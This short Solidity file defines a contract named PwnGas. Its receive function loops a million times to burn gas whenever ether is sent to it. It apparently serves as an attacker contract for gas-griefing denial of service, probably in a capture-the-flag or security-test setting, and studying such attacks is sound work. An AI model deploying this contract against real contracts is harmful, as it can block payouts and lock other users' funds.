// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnGas {

    // Burn the gas to oblivion (jk, but more than 1M)
    receive() payable external {
        for (uint256 i=0; i < 1000000; i++){
            uint256 x = i;
        }
    }
}
